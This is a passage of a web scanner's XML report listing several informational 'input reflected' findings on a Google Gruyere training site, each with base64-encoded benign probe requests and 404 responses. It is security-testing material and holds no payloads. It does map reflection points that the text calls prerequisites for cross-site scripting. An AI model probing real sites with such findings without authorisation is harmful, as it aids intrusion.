      <response base64="true"><![CDATA[SFRUUC8xLjEgNDA0IE5vdCBGb3VuZA0KWC1DbG91ZC1UcmFjZS1Db250ZXh0OiA2YjMwM2NkNjNmY2FmNzAzZmJiY2M2ZmQwMDc3NDhlZg0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTozMTowNiBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpTZXJ2ZXI6IEdvb2dsZSBGcm9udGVuZA0KQ29udGVudC1MZW5ndGg6IDMwNA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCjxodG1sPjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDtjaGFyc2V0PXV0Zi04Ij4KPHRpdGxlPjQwNCBOb3QgRm91bmQ8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5IHRleHQ9IzAwMDAwMCBiZ2NvbG9yPSNmZmZmZmY+CjxoMT5FcnJvcjogTm90IEZvdW5kPC9oMT4KPGgyPlRoZSByZXF1ZXN0ZWQgVVJMIDxjb2RlPi9zdGF0aWMvY29kZWluZGV4aGxlcGFxc3JiZS88L2NvZGU+IHdhcyBub3QgZm91bmQgb24gdGhpcyBzZXJ2ZXIuPC9oMj4KPGgyPjwvaDI+CjwvYm9keT48L2h0bWw+Cg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>1577560349003638784</serialNumber>
    <type>4197376</type>
    <name><![CDATA[Input returned in response (reflected)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/static/codeindex/html]]></path>
    <location><![CDATA[/static/codeindex/html [name of an arbitrarily supplied URL parameter]]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The name of an arbitrarily supplied URL parameter is copied into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9zdGF0aWMvY29kZWluZGV4L2h0bWw/dmwzcHAxenhzZj0xIEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KUmVmZXJlcjogaHR0cDovL2dvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tL2NvZGUvDQpDb29raWU6IEdSVVlFUkVfSUQ9NDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2DQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNDA0IE5vdCBGb3VuZA0KWC1DbG91ZC1UcmFjZS1Db250ZXh0OiAzYzU5YzBkY2FlYWYwNjZkMDc2MDkxNjYyM2U1NDgyMg0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTozMDozMSBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpTZXJ2ZXI6IEdvb2dsZSBGcm9udGVuZA0KQ29udGVudC1MZW5ndGg6IDMxMQ0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCjxodG1sPjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDtjaGFyc2V0PXV0Zi04Ij4KPHRpdGxlPjQwNCBOb3QgRm91bmQ8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5IHRleHQ9IzAwMDAwMCBiZ2NvbG9yPSNmZmZmZmY+CjxoMT5FcnJvcjogTm90IEZvdW5kPC9oMT4KPGgyPlRoZSByZXF1ZXN0ZWQgVVJMIDxjb2RlPi9zdGF0aWMvY29kZWluZGV4L2h0bWw/dmwzcHAxenhzZj0xPC9jb2RlPiB3YXMgbm90IGZvdW5kIG9uIHRoaXMgc2VydmVyLjwvaDI+CjxoMj48L2gyPgo8L2JvZHk+PC9odG1sPgo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>9079304839386002432</serialNumber>
    <type>4197376</type>
    <name><![CDATA[Input returned in response (reflected)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/static/codeindex/html]]></path>
    <location><![CDATA[/static/codeindex/html [URL path filename]]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the URL path filename is copied into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9zdGF0aWMvY29kZWluZGV4L2h0bWxsZGs0eXpzNmpqIEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KUmVmZXJlcjogaHR0cDovL2dvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tL2NvZGUvDQpDb29raWU6IEdSVVlFUkVfSUQ9NDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2DQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNDA0IE5vdCBGb3VuZA0KWC1DbG91ZC1UcmFjZS1Db250ZXh0OiBlNzUxZjQ5YjQ3OWQxOWY3MGEwZmRkZTYzZDQ1YmNmZg0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTozMToxMCBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpTZXJ2ZXI6IEdvb2dsZSBGcm9udGVuZA0KQ29udGVudC1MZW5ndGg6IDMwOA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCjxodG1sPjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDtjaGFyc2V0PXV0Zi04Ij4KPHRpdGxlPjQwNCBOb3QgRm91bmQ8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5IHRleHQ9IzAwMDAwMCBiZ2NvbG9yPSNmZmZmZmY+CjxoMT5FcnJvcjogTm90IEZvdW5kPC9oMT4KPGgyPlRoZSByZXF1ZXN0ZWQgVVJMIDxjb2RlPi9zdGF0aWMvY29kZWluZGV4L2h0bWxsZGs0eXpzNmpqPC9jb2RlPiB3YXMgbm90IGZvdW5kIG9uIHRoaXMgc2VydmVyLjwvaDI+CjxoMj48L2gyPgo8L2JvZHk+PC9odG1sPgo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>7019611848736736256</serialNumber>
    <type>4197376</type>
    <name><![CDATA[Input returned in response (reflected)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/static/codelab.css]]></path>
    <location><![CDATA[/static/codelab.css [URL path filename]]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the URL path filename is copied into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9zdGF0aWMvY29kZWxhYi5jc3NzZjNzNGhhcWVuIEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KUmVmZXJlcjogaHR0cDovL2dvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tLw0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNDA0IE5vdCBGb3VuZA0KWC1DbG91ZC1UcmFjZS1Db250ZXh0OiBiZjE0ZjA2YjFkZTg1ZjM2MmMwZTBlMTY5ZmM3Yjg0ZQ0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOToyOTo0MSBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpTZXJ2ZXI6IEdvb2dsZSBGcm9udGVuZA0KQ29udGVudC1MZW5ndGg6IDMwNQ0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCjxodG1sPjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDtjaGFyc2V0PXV0Zi04Ij4KPHRpdGxlPjQwNCBOb3QgRm91bmQ8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5IHRleHQ9IzAwMDAwMCBiZ2NvbG9yPSNmZmZmZmY+CjxoMT5FcnJvcjogTm90IEZvdW5kPC9oMT4KPGgyPlRoZSByZXF1ZXN0ZWQgVVJMIDxjb2RlPi9zdGF0aWMvY29kZWxhYi5jc3NzZjNzNGhhcWVuPC9jb2RlPiB3YXMgbm90IGZvdW5kIG9uIHRoaXMgc2VydmVyLjwvaDI+CjxoMj48L2gyPgo8L2JvZHk+PC9odG1sPgo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>2819742911260547072</serialNumber>
    <type>4197376</type>
    <name><![CDATA[Input returned in response (reflected)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/static/gruyere-40.png]]></path>
    <location><![CDATA[/static/gruyere-40.png [URL path filename]]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the URL path filename is copied into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9zdGF0aWMvZ3J1eWVyZS00MC5wbmcxYW9ucjlrYjh5IEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNDA0IE5vdCBGb3VuZA0KWC1DbG91ZC1UcmFjZS1Db250ZXh0OiA3MDgxYmZhYWU4MDA0YzFlOGU1ODAwMjdkOTI0MmQ3MA0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTozMDoyMyBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpTZXJ2ZXI6IEdvb2dsZSBGcm9udGVuZA0KQ29udGVudC1MZW5ndGg6IDMwOA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCjxodG1sPjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDtjaGFyc2V0PXV0Zi04Ij4KPHRpdGxlPjQwNCBOb3QgRm91bmQ8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5IHRleHQ9IzAwMDAwMCBiZ2NvbG9yPSNmZmZmZmY+CjxoMT5FcnJvcjogTm90IEZvdW5kPC9oMT4KPGgyPlRoZSByZXF1ZXN0ZWQgVVJMIDxjb2RlPi9zdGF0aWMvZ3J1eWVyZS00MC5wbmcxYW9ucjlrYjh5PC9jb2RlPiB3YXMgbm90IGZvdW5kIG9uIHRoaXMgc2VydmVyLjwvaDI+CjxoMj48L2gyPgo8L2JvZHk+PC9odG1sPgo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>86502343322482184</serialNumber>
    <type>4197376</type>
    <name><![CDATA[Input returned in response (reflected)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/static/gruyere-78.png]]></path>
    <location><![CDATA[/static/gruyere-78.png [URL path filename]]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the URL path filename is copied into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9zdGF0aWMvZ3J1eWVyZS03OC5wbmdhd2EwM2lybTFnIEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNDA0IE5vdCBGb3VuZA0KWC1DbG91ZC1UcmFjZS1Db250ZXh0OiAxMDNlOTgyYjJlN2RjZTBkZjIzZTNjMDY1NTA2Y2ZlNw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOToyOTo0MCBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpTZXJ2ZXI6IEdvb2dsZSBGcm9udGVuZA0KQ29udGVudC1MZW5ndGg6IDMwOA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCjxodG1sPjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDtjaGFyc2V0PXV0Zi04Ij4KPHRpdGxlPjQwNCBOb3QgRm91bmQ8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5IHRleHQ9IzAwMDAwMCBiZ2NvbG9yPSNmZmZmZmY+CjxoMT5FcnJvcjogTm90IEZvdW5kPC9oMT4KPGgyPlRoZSByZXF1ZXN0ZWQgVVJMIDxjb2RlPi9zdGF0aWMvZ3J1eWVyZS03OC5wbmdhd2EwM2lybTFnPC9jb2RlPiB3YXMgbm90IGZvdW5kIG9uIHRoaXMgc2VydmVyLjwvaDI+CjxoMj48L2gyPgo8L2JvZHk+PC9odG1sPgo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>872569965808864256</serialNumber>
    <type>4197376</type>
    <name><![CDATA[Input returned in response (reflected)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/static/gruyere-badge.png]]></path>
    <location><![CDATA[/static/gruyere-badge.png [URL path filename]]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the URL path filename is copied into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9zdGF0aWMvZ3J1eWVyZS1iYWRnZS5wbmdiaGFjNThlMXo2IEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNDA0IE5vdCBGb3VuZA0KWC1DbG91ZC1UcmFjZS1Db250ZXh0OiAxNGFiNzY5NmNiYmU1NWFhNWY2YTMxNDBiNjQ3NGMwYg0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTozMDoyMiBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpTZXJ2ZXI6IEdvb2dsZSBGcm9udGVuZA0KQ29udGVudC1MZW5ndGg6IDMxMQ0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCjxodG1sPjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDtjaGFyc2V0PXV0Zi04Ij4KPHRpdGxlPjQwNCBOb3QgRm91bmQ8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5IHRleHQ9IzAwMDAwMCBiZ2NvbG9yPSNmZmZmZmY+CjxoMT5FcnJvcjogTm90IEZvdW5kPC9oMT4KPGgyPlRoZSByZXF1ZXN0ZWQgVVJMIDxjb2RlPi9zdGF0aWMvZ3J1eWVyZS1iYWRnZS5wbmdiaGFjNThlMXo2PC9jb2RlPiB3YXMgbm90IGZvdW5kIG9uIHRoaXMgc2VydmVyLjwvaDI+CjxoMj48L2gyPgo8L2JvZHk+PC9odG1sPgo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>4031675484960333824</serialNumber>
    <type>4197376</type>
    <name><![CDATA[Input returned in response (reflected)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/static/gruyere.png]]></path>
    <location><![CDATA[/static/gruyere.png [URL path filename]]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the URL path filename is copied into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9zdGF0aWMvZ3J1eWVyZS5wbmdtYW16c2tya3RhIEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNDA0IE5vdCBGb3VuZA0KWC1DbG91ZC1UcmFjZS1Db250ZXh0OiBmMmEyZTdjMzJmMGYyY2M5N2QxNTQwNzJhNWMyN2EwOA0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOToyOTo1MyBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpTZXJ2ZXI6IEdvb2dsZSBGcm9udGVuZA0KQ29udGVudC1MZW5ndGg6IDMwNQ0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCjxodG1sPjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDtjaGFyc2V0PXV0Zi04Ij4KPHRpdGxlPjQwNCBOb3QgRm91bmQ8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5IHRleHQ9IzAwMDAwMCBiZ2NvbG9yPSNmZmZmZmY+CjxoMT5FcnJvcjogTm90IEZvdW5kPC9oMT4KPGgyPlRoZSByZXF1ZXN0ZWQgVVJMIDxjb2RlPi9zdGF0aWMvZ3J1eWVyZS5wbmdtYW16c2tya3RhPC9jb2RlPiB3YXMgbm90IGZvdW5kIG9uIHRoaXMgc2VydmVyLjwvaDI+CjxoMj48L2gyPgo8L2JvZHk+PC9odG1sPgo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
</issues>
